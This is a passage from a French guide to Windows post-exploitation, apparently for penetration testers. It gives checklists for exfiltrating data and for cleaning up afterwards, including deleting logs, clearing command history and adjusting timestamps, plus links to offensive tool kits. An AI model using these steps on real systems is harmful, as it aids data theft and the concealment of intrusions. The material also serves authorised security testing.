‚òê Donn√©es critiques sauvegard√©es
‚òê M√©thode exfiltration choisie
‚òê Exfiltration test√©e et fonctionnelle
‚òê Donn√©es transf√©r√©es avec succ√®s
‚òê Preuves de compromission document√©es
‚òê Impact business √©valu√©
```

### **Phase nettoyage**
```bash
‚òê Logs compromettants identifi√©s
‚òê Traces d'activit√© supprim√©es
‚òê Fichiers temporaires nettoy√©s
‚òê Historiques commandes vid√©s
‚òê Timestamps fichiers ajust√©s
‚òê Persistence supprim√©e si demand√©
‚òê Services ajout√©s supprim√©s
‚òê Syst√®me restaur√© √©tat initial
```

## üéØ Ressources et R√©f√©rences

### **Outils de post-exploitation**
- **Mimikatz** : https://github.com/gentilkiwi/mimikatz
- **PowerUp** : https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- **PrivescCheck** : https://github.com/itm4n/PrivescCheck
- **BloodHound** : https://github.com/BloodHoundAD/BloodHound

### **Frameworks complets**
- **Empire** : https://github.com/EmpireProject/Empire
- **Covenant** : https://github.com/cobbr/Covenant
- **Metasploit** : https://www.metasploit.com/
- **Cobalt Strike** : https://www.cobaltstrike.com/

### **Documentation technique**
- **MITRE ATT&CK** : https://attack.mitre.org/tactics/TA0004/
- **LOLBAS** : https://lolbas-project.github.io/
- **GTFOBins** : https://gtfobins.github.io/
- **Windows Internals** : https://docs.microsoft.com/en-us/sysinternals/

---
*La post-exploitation Windows est un art qui demande patience et cr√©ativit√©. Plus vous comprenez le syst√®me, plus vous devenez efficace !* 